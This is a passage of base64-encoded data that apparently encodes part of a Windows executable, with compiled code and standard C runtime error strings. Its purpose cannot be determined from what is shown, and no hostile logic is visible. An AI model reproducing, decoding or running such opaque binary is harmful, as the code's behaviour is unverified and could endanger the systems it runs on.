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92LOjtmf///3Yw6OWZ////djTo3Zn///92HOjVmf///3Y46M2Z////djzoxZn//4PEQP92QOi6mf///3ZE6LKZ////dkjoqpn///92TOiimf///3ZQ6JqZ////dlTokpn///92WOiKmf///3Zc6IKZ////dmDoepn///92ZOhymf///3Zo6GqZ////dmzoYpn///92cOhamf///3Z06FKZ////dnjoSpn///92fOhCmf//g8RA/7aAAAAA6DSZ////toQAAADoKZn///+2iAAAAOgemf///7aMAAAA6BOZ////tpAAAADoCJn///+2lAAAAOj9mP///7aYAAAA6PKY////tpwAAADo55j///+2oAAAAOjcmP///7akAAAA6NGY////tqgAAADoxpj//4PELF5dw4v/VYvsVot1CIX2dDWLBjsFeB5BAHQHUOijmP//WYtGBDsFfB5BAHQHUOiRmP//WYt2CDs1gB5BAHQHVuh/mP//WV5dw4v/VYvsVot1CIX2dH6LRgw7BYQeQQB0B1DoXZj//1mLRhA7BYgeQQB0B1DoS5j//1mLRhQ7BYweQQB0B1DoOZj//1mLRhg7BZAeQQB0B1DoJ5j//1mLRhw7BZQeQQB0B1DoFZj//1mLRiA7BZgeQQB0B1DoA5j//1mLdiQ7NZweQQB0B1bo8Zf//1leXcPMzMzMzMzMzFWL7FYzwFBQUFBQUFBQi1UMjUkAigIKwHQJg8IBD6sEJOvxi3UIg8n/jUkAg8EBigYKwHQJg8YBD6MEJHPui8GDxCBeycPMzMzMzMzMzMzMi1QkBItMJAj3wgMAAAB1PIsCOgF1LgrAdCY6YQF1JQrkdB3B6BA6QQJ1GQrAdBE6YQN1EIPBBIPCBArkddKL/zPAw5AbwNHgg8ABw/fCAQAAAHQYigKDwgE6AXXng8EBCsB03PfCAgAAAHSkZosCg8ICOgF1zgrAdMY6YQF1xQrkdL2DwQLriMzMzMzMzMzMVYvsVjPAUFBQUFBQUFCLVQyNSQCKAgrAdAmDwgEPqwQk6/GLdQiL/4oGCsB0DIPGAQ+jBCRz8Y1G/4PEIF7Jw4v/VYvsUVaLdQxW6PB+//+JRQyLRgxZqIJ1Gegtbv//xwAJAAAAg04MILj//wAA6T0BAACoQHQN6BBu///HACIAAADr4agBdBeDZgQAqBAPhI0AAA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jHQAC4x0AAzMdAAItFCF5fycOQikYDiEcDi0UIXl/Jw41JAIpGA4hHA4pGAohHAotFCF5fycOQikYDiEcDikYCiEcCikYBiEcBi0UIXl/Jw4v/VYvsgewoAwAAoQQQQQAzxYlF/PYF0B5BAAFWdAhqCuiajf//Weio4f//hcB0CGoW6Krh//9Z9gXQHkEAAg+EygAAAImF4P3//4mN3P3//4mV2P3//4md1P3//4m10P3//4m9zP3//2aMlfj9//9mjI3s/f//ZoydyP3//2aMhcT9//9mjKXA/f//ZoytvP3//5yPhfD9//+LdQSNRQSJhfT9///HhTD9//8BAAEAibXo/f//i0D8alCJheT9//+Nhdj8//9qAFDoTHv//42F2Pz//4PEDImFKP3//42FMP3//2oAx4XY/P//FQAAQIm15Pz//4mFLP3///8VTOBAAI2FKP3//1D/FUjgQABqA+gojP//zGoQaDj+QADolGr//zPAi10IM/873w+VwDvHdR3oYF7//8cAFgAAAFdXV1dX6Ohd//+DxBSDyP/rU4M9hCtBAAN1OGoE6Dq+//9ZiX38U+jG0///WYlF4DvHdAuLc/yD7gmJdeTrA4t15MdF/P7////oJQAAADl94HUQU1f/NaQoQQD/FTDgQACL8IvG6FRq///DM/+LXQiLdeRqBOgIvf//WcOL/1WL7IPsDKEEEEEAM8WJRfxqBo1F9FBoBBAAAP91CMZF+gD/FTDhQACFwHUFg8j/6wqNRfRQ6PEBAABZi038M83o2k7//8nDi/9Vi+yD7DShBBBBADPFiUX8i0UQi00YiUXYi0UUU4lF0IsAVolF3ItFCFcz/4lNzIl94Il91DtFDA+EXwEAAIs15OBAAI1N6FFQ/9aLHWTgQACFwHReg33oAXVYjUXoUP91DP/WhcB0S4N96AF1RYt13MdF1AEAAACD/v91DP912OgBqv//i/BZRjv3fluB/vD//393U41ENgg9AAQAAHcv6BEBAACLxDvHdDjHAMzMAADrLVdX/3Xc/3XYagH/dQj/04vwO/d1wzPA6dEAAABQ6Mbx//9ZO8d0CccA3d0AAIPACIlF5OsDiX3kOX3kdNiNBDZQV/915OgZef//g8QMVv915P913P912GoB/3UI/9OFwHR/i13MO990HVdX/3UcU1b/deRX/3UM/xVw4E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QAAQC6AAEAyAABANAAAQD6BQEA7AUBAEQBAQBSAQEAZAEBAHgBAQCMAQEAqAEBAMYBAQDaAQEA8gEBAAoCAQAWAgEAKAIBAD4CAQBKAgEAVgIBAGwCAQB8AgEAjgIBAJoCAQCuAgEAwAIBAM4CAQDeAgEA9AIBAAoDAQAkAwEAPgMBAFADAQBeAwEAcAMBAIgDAQCWAwEAogMBALADAQC6AwEA0gMBAOgDAQAABAEADgQBABwEAQA2BAEARgQBAFwEAQB2BAEAggQBAIwEAQCYBAEAqgQBALgEAQDgBAEA8AQBAAQFAQAUBQEAKgUBADoFAQBGBQEAVgUBAGQFAQB0BQEAhAUBAJQFAQCmBQEAuAUBAMoFAQDaBQEAAAAAAAQBAQAAAAAAJgEBAAAAAADqAAEAAAAAAAAAAAAAAAAAAAAAAP4tQACFbkAAn5pAAOCoQABfUkAAAAAAAAAAAABFxEAAry5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzRZTAAAAAAIAAABXAAAAEPkAABDfAAAQIEEAaCBBAGMAYwBzAAAAVQBUAEYALQA4AAAAVQBUAEYALQAxADYATABFAAAAAABVAE4ASQBDAE8ARABFAAAAQ29yRXhpdFByb2Nlc3MAAG0AcwBjAG8AcgBlAGUALgBkAGwAbAAAAHJ1bnRpbWUgZXJyb3IgAAANCgAAVExPU1MgZXJyb3INCgAAAFNJTkcgZXJyb3INCgAAAABET01BSU4gZXJyb3INCgAAUjYwMzQNCkFuIGFwcGxpY2F0aW9uIGhhcyBtYWRlIGFuIGF0dGVtcHQgdG8gbG9hZCB0aGUgQyBydW50aW1lIGxpYnJhcnkgaW5jb3JyZWN0bHkuClBsZWFzZSBjb250YWN0IHRoZSBhcHBsaWNhdGlvbidzIHN1cHBvcnQgdGVhbSBmb3IgbW9yZSBpbmZvcm1hdGlvbi4NCgAAAAAAAFI2MDMzDQotIEF0dGVtcHQgdG8gdXNlIE1TSUwgY29kZSBmcm9tIHRoaXMgYXNzZW1ibHkgZHVyaW5nIG5hdGl2ZSBjb2RlIGluaXRpYWxpemF0aW9uClRoaXMgaW5kaWNhdGVzIGEgYnVnIGluIHlvdXIgYXBwbGljYXRpb24uIEl0IGlzIG1vc3QgbGlrZWx5IHRoZSByZXN1bHQgb2YgY2FsbGluZyBhbiBNU0lMLWNvbXBpbGVkICgvY2xyKSBmdW5jdGlvbiBmcm9tIGEgbmF0aXZlIGNvbnN0cnVjdG9yIG9yIGZyb20gRGxsTWFpbi4NCgAAUjYwMzINCi0gbm90IGVub3VnaCBzcGFjZSBmb3IgbG9jYWxlIGluZm9ybWF0aW9uDQoAAAAAAABSNjAzMQ0KLSBBdHRlbXB0IHRvIGluaXRpYWxpemUgdGhlIENSVCBtb3JlIHRoYW4gb25jZS4KVGhpcyBpbmRpY2F0ZXMgYSBidWcgaW4geW91ciBhcHBsaWNhdGlvbi4NCgAAUjYwMzANCi0gQ1JUIG5vdCBpbml0aWFsaXplZA0KAABSNjAyOA0KLSB1bmFibGUgdG8gaW5pdGlhbGl6ZSBoZWFwDQoAAAAAUjYwMjcNCi0gbm90IGVub3VnaCBzcGFjZSB